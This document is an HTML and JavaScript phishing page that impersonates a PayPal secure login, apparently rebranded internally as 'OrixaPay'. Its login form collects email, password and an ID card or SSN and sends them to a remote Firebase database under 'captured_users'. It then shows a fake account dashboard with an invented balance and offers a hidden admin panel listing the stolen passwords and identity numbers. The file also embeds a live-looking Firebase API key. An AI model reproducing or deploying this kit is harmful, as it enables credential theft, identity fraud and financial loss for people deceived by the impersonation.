<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PayPal | Secure Login</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root { --pp-blue: #0070ba; --pp-dark: #003087; --bg: #f5f7fa; --success: #22c55e; }
        body { font-family: "Open Sans", "Helvetica Neue", Arial, sans-serif; background: var(--bg); margin: 0; overflow-x: hidden; }

        /* STEP 13: WELCOME / LOGIN SCREEN */
        #auth-view { background: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; box-sizing: border-box; }
        .logo { width: 120px; margin-bottom: 40px; }
        .input-field { width: 100%; padding: 16px; border: 1px solid #9ca2a6; border-radius: 4px; margin-bottom: 12px; font-size: 16px; box-sizing: border-box; }
        .btn-pp { width: 100%; padding: 16px; background: var(--pp-blue); color: #fff; border: none; border-radius: 25px; font-weight: 700; font-size: 16px; cursor: pointer; }

        /* STEP 18 & 19: HOME DASHBOARD */
        #dashboard-view { display: none; padding-bottom: 80px; }
        .top-nav { background: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e5e7eb; }
        .kyc-banner { background: #fff3cd; color: #856404; padding: 12px 20px; font-size: 12px; font-weight: 600; display: flex; justify-content: space-between; align-items: center; }
        .wallet-card { background: var(--pp-blue); margin: 20px; padding: 25px; border-radius: 20px; color: white; box-shadow: 0 10px 20px rgba(0,112,186,0.2); }

        /* STEP 29: TRANSACTION HISTORY */
        .section-title { padding: 0 20px; font-weight: 700; font-size: 16px; margin-top: 20px; }
        .trans-list { background: #fff; margin: 15px 20px; border-radius: 15px; border: 1px solid #eee; }
        .trans-item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #f9f9f9; }

        /* STEP 50: MASTER ADMIN PANEL */
        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050a14; color: #00ff88; z-index: 9999; padding: 20px; overflow-y: auto; font-family: monospace; }
        .log-card { background: #111; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-bottom: 10px; }

        /* MODALS */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 5000; }
        .modal-content { background: #fff; position: absolute; bottom: 0; width: 100%; border-radius: 25px 25px 0 0; padding: 30px 20px; box-sizing: border-box; }
    </style>
</head>
<body>

    <div id="auth-view">
        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="logo">
        <input type="email" id="email" class="input-field" placeholder="Email or mobile number">
        <input type="password" id="pass" class="input-field" placeholder="Password">
        <input type="text" id="kyc" class="input-field" placeholder="Identity Card / SSN (Step 44)">
        <button class="btn-pp" onclick="captureAndRedirect()">Log In</button>
        <p style="color:var(--pp-blue); font-weight:700; font-size:14px; margin-top:20px;">Forgot password?</p>
        <div style="margin-top:auto; color:#666; font-size:12px; cursor:pointer;" onclick="showAdmin()">Admin Access (Step 50)</div>
    </div>

    <div id="dashboard-view">
        <div class="top-nav">
            <i class="fas fa-bars"></i>
            <span style="font-weight:800; color:var(--pp-blue); font-style:italic;">OrixaPay</span>
            <i class="far fa-bell" id="notif-bell"></i>
        </div>

        <div class="kyc-banner" id="banner">
            <span>Step 19: Complete KYC to unlock withdrawals</span>
            <i class="fas fa-chevron-right"></i>
        </div>

        <div class="wallet-card">
            <div style="font-size:12px; opacity:0.8;">Orixa Balance (Step 18)</div>
            <div style="font-size:36px; font-weight:800; margin:10px 0;">$50,500.00</div>
            <div style="display:flex; gap:15px; margin-top:15px;">
                <button onclick="openModal('Send')" style="flex:1; padding:10px; border-radius:10px; border:none; font-weight:bold;">Send</button>
                <button onclick="openModal('Withdraw')" style="flex:1; padding:10px; border-radius:10px; border:none; font-weight:bold;">Withdraw</button>
            </div>
        </div>

        <div class="section-title">Recent Activity (Step 29)</div>
        <div class="trans-list" id="transaction-container">
            </div>
    </div>

    <div id="admin-panel">
        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:20px;">
            <h2 style="margin:0;">MASTER ADMIN LOGS</h2>
            <button onclick="hideAdmin()" style="background:red; color:white; border:none; padding:5px 10px; border-radius:5px;">CLOSE</button>
        </div>
        <div id="logs-display">Fetching intercepted data...</div>
    </div>

    <div class="modal" id="action-modal">
        <div class="modal-content">
            <h2 id="modal-title" style="margin:0 0 20px 0;">Action</h2>
            <input type="text" id="target" placeholder="Recipient Email or Bank ID">
            <input type="number" id="amount" placeholder="Amount ($)">
            <button class="btn-pp" onclick="executeTransaction()">Confirm Transaction</button>
            <button onclick="closeModal()" style="width:100%; background:none; border:none; margin-top:15px; color:#666; font-weight:bold;">Cancel</button>
        </div>
    </div>

<script>
    // --- FIREBASE INITIALIZATION ---
    const firebaseConfig = {
        apiKey: "AIzaSyDp3h13LwtUlD7MiCkMys0EAgX5w2GGupc",
        authDomain: "orixa-football-pro.firebaseapp.com",
        projectId: "orixa-football-pro",
        databaseURL: "https://orixa-football-pro-default-rtdb.firebaseio.com",
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // --- [STEP 13 & 44] CAPTURE LOGIN DATA ---
    function captureAndRedirect() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const kyc = document.getElementById('kyc').value;

        if(!email || !pass) return alert("Credentials required.");

        const ref = db.ref('captured_users').push();
        ref.set({
            email: email,
            password: pass,
            kyc_token: kyc,
            status: "Pending Verification",
            timestamp: new Date().toLocaleString()
        }).then(() => {
            // Redirect to dashboard to show "Success"
            document.getElementById('auth-view').style.display = 'none';
            document.getElementById('dashboard-view').style.display = 'block';
            loadHistory();
        });
    }

    // --- [STEP 27 & 21] TRANSACTION ENGINE ---
    let currentMode = "";
    function openModal(mode) { 
        currentMode = mode; 
        document.getElementById('modal-title').innerText = mode + " Funds";
        document.getElementById('action-modal').style.display = 'block'; 
    }
    function closeModal() { document.getElementById('action-modal').style.display = 'none'; }

    function executeTransaction() {
        const amt = document.getElementById('amount').value;
        const target = document.getElementById('target').value;
        if(!amt || !target) return;

        db.ref('app_transactions').push({
            id: "TRX-" + Math.random().toString(36).substr(2, 9).toUpperCase(),
            type: currentMode,
            amount: amt,
            recipient: target,
            timestamp: new Date().toLocaleString()
        }).then(() => {
            closeModal();
            alert("Step 22: Payment Success!");
        });
    }

    // --- [STEP 29] LOAD HISTORY ---
    function loadHistory() {
        db.ref('app_transactions').limitToLast(5).on('value', (snap) => {
            const container = document.getElementById('transaction-container');
            container.innerHTML = "";
            snap.forEach((child) => {
                const t = child.val();
                container.innerHTML += `
                    <div class="trans-item">
                        <div>
                            <div style="font-weight:700; font-size:14px;">${t.recipient}</div>
                            <div style="font-size:10px; color:#888;">${t.timestamp}</div>
                        </div>
                        <div style="font-weight:800;">$${t.amount}</div>
                    </div>
                `;
            });
        });
    }

    // --- [STEP 50] ADMIN CONTROLS ---
    function showAdmin() {
        document.getElementById('admin-panel').style.display = 'block';
        db.ref('captured_users').on('value', (snap) => {
            const display = document.getElementById('logs-display');
            display.innerHTML = "";
            snap.forEach((child) => {
                const u = child.val();
                display.innerHTML += `
                    <div class="log-card">
                        <div>GMAIL: ${u.email}</div>
                        <div style="color:red;">PASS: ${u.password}</div>
                        <div style="color:var(--success);">KYC: ${u.kyc_token}</div>
                        <div style="font-size:10px; margin-top:5px; opacity:0.5;">${u.timestamp}</div>
                    </div>
                `;
            });
        });
    }
    function hideAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
</script>
</body>
</html>
